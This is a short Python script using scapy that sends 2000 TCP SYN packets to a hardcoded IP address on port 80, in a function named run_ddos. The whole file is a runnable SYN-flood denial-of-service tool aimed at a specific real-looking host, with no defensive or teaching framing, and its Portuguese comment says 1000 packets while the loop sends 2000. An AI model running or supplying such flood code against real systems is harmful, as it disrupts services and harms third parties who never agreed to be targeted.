from scapy.all import *

target_ip = "162.159.133.234"
target_port = 80


def run_ddos(target_ip: str = "162.159.133.234", target_port: int = 80):
    for i in range(2000):  # Envia 1000 pacotes SYN
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags="S")
        send(ip / tcp)


if __name__ == '__main__':

    run_ddos()
